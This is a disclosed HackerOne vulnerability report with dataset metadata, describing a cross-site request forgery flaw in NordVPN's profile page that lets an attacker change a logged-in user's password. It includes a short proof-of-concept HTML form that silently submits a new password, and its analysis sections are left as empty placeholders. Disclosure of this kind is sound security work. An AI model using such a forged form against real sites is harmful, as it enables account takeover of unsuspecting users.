---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '204703'
original_report_id: '204703'
title: CSRF to change password
weakness: Cross-Site Request Forgery (CSRF)
team_handle: nordsecurity
created_at: '2017-02-08T18:10:55.317Z'
disclosed_at: '2022-01-12T08:33:48.507Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 62
tags:
- hackerone
- cross-site-request-forgery-csrf
---

# CSRF to change password

## Metadata

- HackerOne Report ID: 204703
- Weakness: Cross-Site Request Forgery (CSRF)
- Program: nordsecurity
- Disclosed At: 2022-01-12T08:33:48.507Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Description 

Cross-Site Request Forgery (CSRF) is a type of attack that occurs when a malicious web site, email, blog, instant message, or program causes a user's web browser to perform an unwanted action on a trusted site for which the user is currently authenticated.


I have found CSRF to change password , 

POC 


<html>

  <body>
    <form action="https://nordvpn.com/profile/" method="POST">
      <input type="hidden" name="tmpl" value="settings" />
      <input type="hidden" name="password" value="password" />
      <input type="hidden" name="password&#95;confirmation" value="password" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

Thanks

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
